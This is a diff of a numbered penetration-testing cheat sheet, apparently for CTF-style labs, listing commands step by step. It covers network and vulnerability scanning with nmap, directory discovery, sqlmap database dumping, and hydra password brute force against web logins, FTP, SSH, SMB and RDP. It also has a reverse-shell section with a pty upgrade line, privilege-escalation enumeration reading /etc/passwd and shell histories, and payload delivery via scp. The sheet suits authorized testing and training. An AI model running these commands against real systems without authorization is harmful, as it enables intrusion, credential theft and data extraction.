@@ -1,82 +1,88 @@
-# 1° Scan Nmap 
+# 1° Network Scan Nmap 
 
-$sudo nmap 10.0.0.0/24 -oN report-nmap.txt
+$ sudo nmap 10.0.0.0/24 -oN report-nmap.txt
 
-$sudo nmap -Pn -p- -sV -v [Target_IP] -oN report-nmap.txt
+$ sudo nmap -Pn -p- -sV -v 10.0.0.123 -oN report-all-ports-nmap.txt
 
-$sudo nmap -Pn -A [Target_IP] -oN report-nmap.txt
+$ sudo nmap -Pn -A 10.0.0.123 -oN report-agressive-nmap.txt
 
-$sudo nmap -Pn -sV -sC -O [Target_IP] -oN report-nmap.txt
+$ sudo nmap -Pn -sV -sC -O 10.0.0.123 -oN report-basic-nmap.txt
 
-$sudo nmap -Pn --script vuln [Target_IP]
+$ sudo nmap -Pn --script vuln 10.0.0.123 -oN report-all-vulns.txt
 
-$sudo nmap -Pn -p 80 --script http-enum,http-robots.txt [Target_IP]
+$ sudo nmap -Pn -p 80 --script http-enum,http-robots.txt 10.0.0.123
 
-$sudo nmap -Pn -p 80 --script http-sql-injection [Target_IP]
+$ sudo nmap -Pn -p 80 --script http-sql-injection 10.0.0.123
 
-$sudo nmap -Pn -p 80 --script http-passwd --script-args http-passwd.root=/test/ [Target_IP]
+$ sudo nmap -Pn -p 80 --script http-passwd --script-args http-passwd.root=/test/ 10.0.0.123
 
-$sudo nmap -Pn -p 80 --script http-vuln-* [Target_IP]
+$ sudo nmap -Pn -p 80 --script http-vuln-* 10.0.0.123
 
-$sudo nmap -Pn -p 21 --script ftp-anon [Target_IP]
+$ sudo nmap -Pn -p 21 --script ftp-anon 10.0.0.123
 
-$sudo nmap -Pn -p 21 --script ftp-proftpd-backdoor [Target_IP] - ProFTPD 1.3.3c
+$ sudo nmap -Pn -p 21 --script ftp-proftpd-backdoor 10.0.0.123 [ProFTPD 1.3.3c]
 
-$sudo nmap -Pn -p 21 --script ftp-vsftpd-backdoor [Target_IP] - vsFTPd 2.3.4
+$ sudo nmap -Pn -p 21 --script ftp-vsftpd-backdoor 10.0.0.123 [vsFTPd 2.3.4]
 
-#nmap -Pn -p 111 --script nfs-ls,nfs-statfs,nfs-showmount [Target_IP]
+# sudo nmap -Pn -p 111 --script nfs-ls,nfs-statfs,nfs-showmount 10.0.0.123
 
-#nmap -Pn -p 445 --script smb-enum-shares,smb-enum-users [Target_IP]
+# sudo nmap -Pn -p 445 --script smb-enum-shares,smb-enum-users 10.0.0.123
 
-#nmap -Pn -p 445 --script smb-vuln-* [Target_IP]
+# sudo nmap -Pn -p 445 --script smb-vuln-* 10.0.0.123
 
 https://www.exploit-db.com
 
-# 2° Scan Dirb/Gobuster/Nikto
+# 2° Web-Server Scan Dirb/Gobuster/Nikto
 
-$dirb http://Target_IP -o dirb-report.txt
+$ dirb http://Target_IP -o dirb-report.txt
 
-$dirb http://Target_IP -X .txt -w /usr/share/dirb/wordlists/small.txt -o dirb-report.txt
+$ dirb http://Target_IP -X .txt -w /usr/share/dirb/wordlists/small.txt -o dirb-report.txt
 
-$dirb http://Target_IP:8080 -w /usr/share/dirb/wordlists/big.txt -u user:password
+$ dirb http://Target_IP:8080 -w /usr/share/dirb/wordlists/big.txt -u user:password
 
-$gobuster -u http://Target -x php,html,js,txt,zip -w /usr/share/dirb/wordlists/big.txt dir
+$ gobuster -u http://Target -x php,html,js,txt,zip -w /usr/share/dirb/wordlists/big.txt dir
 
-$nikto -h http://Target_IP -o report.html
+$ nikto -h http://Target_IP -o report.html
 
-$nikto -h http://Target_IP:8080/ -id user:password
+$ nikto -h http://Target_IP:8080/ -id user:password
 
-# 3° Scan SQLMap/Burp Suite/ZAP
+# 3° Web-Site-DB Scan SQLMap/Burp Suite/ZAP
 
-$sqlmap -u http://Target_IP/login.php --forms --dump
+$ sqlmap -u http://Target_IP/login.php --forms --dump
 
-$sqlmap -u http://Target_IP/listproducts.php?cat=1 –-dbs
+$ sqlmap -u http://Target_IP/listproducts.php?cat=1 –-dbs
 
-$sqlmap -u  http://Target_IP/listproducts.php?cat=1 –-dbs -D products –-tables
+$ sqlmap -u  http://Target_IP/listproducts.php?cat=1 –-dbs -D products –-tables
 
 Burp Suite > Proxy > Intercept > Open Browser > Intercept on
 
 Burp Suite > Intruder > Sniper attack > Positions Add > Payload Type = Simple list
 
-# 4° Brute Force
+# 4° Password Brute Force
 
-$hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
+$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
 
-$hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP ftp
+$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP ftp
 
-$hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP ssh
+$ hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP ssh
 
-$hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP smb
+$ hydra -f -L name-list.txt -P /usr/share/wordlists/rockyou.txt Target_IP ssh
 
-$hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP rdp
+$ hydra -L name-list.txt -P /usr/share/wordlists/rockyou.txt Target_IP -s 2222 ssh
 
-$hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP -s 8080 http-get
+$ hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP smb
 
-$hydra -f -L user-name.txt -P /usr/share/wordlists/rockyou.txt Target_IP ssh
+$ hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP rdp
+
+$ hydra -L name-list.txt -P /usr/share/wordlists/rockyou.txt Target_IP -s 33389 rdp
+
+$ hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP http-get
+
+$ hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP -s 8080 http-get
 
 # 5° Scan SMB
 
-$enum4linux -a Target_IP | tee enum4linux.log
+$ enum4linux -a Target_IP
 
 # 6° Gain Access
 
@@ -90,19 +96,19 @@ http://example.com/hiden/dir
 
 http://example.com/robots.txt
 
-$ftp Target_IP
+$ ftp Target_IP [user anonymous]
 
-$ssh user@Target_IP
+$ ssh user@Target_IP
 
-$ssh -i id_rsa user@Target_IP
+$ ssh -i id_rsa user@Target_IP
 
-$ssh -oHostKeyAlgorithms=+ssh-rsa user@Target_IP
+$ ssh -oHostKeyAlgorithms=+ssh-rsa user@Target_IP
 
-$sudo mount -o rw Target_IP:/backup /tmp/dir-target
+$ sudo mount -o rw Target_IP:/backup /tmp/dir-target
 
-$sudo mount -t cifs -o username=user_name //Target_IP/share_name /mnt/dir-target
+$ sudo mount -t cifs -o username=user_name //Target_IP/share_name /mnt/dir-target
 
-$smbclient //Target_IP/shared/dir
+$ smbclient //Target_IP/shared/dir
 
 # 7° Reverse Shell
 
@@ -122,39 +128,39 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 # 8° Search Priv-Esc
 
-$cat /etc/proc/version
+$ cat /etc/proc/version
 
-$cat /etc/issue
+$ cat /etc/issue
 
-$cat /etc/passwd
+$ cat /etc/passwd
 
-$cat /etc/crontab
+$ cat /etc/crontab
 
-$cat /etc/exports
+$ cat /etc/exports
 
-$cat ~/.*history | less
+$ cat ~/.*history | less
 
-$id
+$ id
 
-$ls -la /
+$ ls -la /
 
-$ls -la /home
+$ ls -la /home
 
-$ls -la /home/user/.ssh
+$ ls -la /home/user/.ssh
 
-$sudo -l
+$ sudo -l
 
-$getcap -r / 2>/dev/null
+$ getcap -r / 2>/dev/null
 
-$find / -perm -o w -type d 2>/dev/null
+$ find / -perm -o w -type d 2>/dev/null
 
-$find / -perm -u=s -type f 2>/dev/null
+$ find / -perm -u=s -type f 2>/dev/null
 
-$find / -name perl* python* gcc* 2>/dev/nul
+$ find / -name perl* python* gcc* 2>/dev/nul
 
-$find /home -name flag*.txt
+$ find /home -name flag*.txt
 
-$find / -user "www-data" -name "*" 2>/dev/null
+$ find / -user "www-data" -name "*" 2>/dev/null
 
 https://gtfobins.github.io
 
@@ -162,8 +168,8 @@ https://www.exploit-db.com
 
 # 9° Deploy Payload
 
-$python2 -m SimpleHTTPServer 8000
+$ python2 -m SimpleHTTPServer 8000
 
-$python3 -m http-server 8000
+$ python3 -m http-server 8000
 
-$scp payload.sh user@Target_IP:/home/user
+$ scp payload.sh user@Target_IP:/home/user
